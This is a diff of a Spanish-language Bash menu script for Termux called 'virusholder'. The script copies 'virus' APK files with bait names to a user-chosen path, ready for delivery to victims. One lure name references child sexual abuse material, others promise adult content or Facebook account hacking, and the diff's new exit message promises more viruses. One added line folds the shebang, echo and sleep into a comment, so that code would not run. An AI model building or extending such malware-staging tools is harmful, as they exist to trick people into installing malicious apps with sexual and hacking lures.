@@ -1,8 +1,4 @@
-#/bin/bash
-#hecho por diegoh colider de theholders
-                                                  echo -e "\e[1;31mEste script a sido creado con fines educativos y informativos, cualquier uso indebido no es responsabilidad mia\e[0m"
-
-sleep 3                                           
+#/bin/bash                                        #hecho por diegoh colider de theholders                                                             echo -e "\e[1;31mEste script a sido creado con fines educativos y informativos, cualquier uso indebido no es responsabilidad mia\e[0m"                                                                  sleep 3                                           
 clear
 
 figlet -f smslant virusholder
@@ -28,7 +24,7 @@ echo '[ 4 ]  📱VIP +18🔞.apk'
 
 sleep 0.1
 
-echo '[ 5 ]  Facebookhackearcuentas.apk'
+echo '[ 5 ]  Exit'
 
 sleep 0.1
 
@@ -61,6 +57,7 @@ sleep 2
 cd /data/data/com.termux/files/home/virusmenuholder
 
 read -p "que ruta quieres mover el virus:" ruta
+
 cp 'Porno infantil.apk' $ruta
         ;;
 4)
@@ -69,16 +66,13 @@ sleep 2
 
 cd /data/data/com.termux/files/home/virusmenuholder
 
-read -p "que ruta quieres mover el virus:" ruta   cp '📱VIP +18🔞.apk' $ruta
+read -p "que ruta quieres mover el virus:" ruta
+
+cp '📱VIP +18🔞.apk' $ruta
         ;;
 5)
-        echo 'Preparando virus seleccionado...'
-sleep 2
-
-cd /data/data/com.termux/files/home/virusmenuholder
-
-read -p "que ruta quieres mover el virus:" ruta   
-cp Facebookhackearcuentas.apk $ruta
+        echo 'exit, proximamente mas virus'
+exit
         ;;
 *)
         ;;
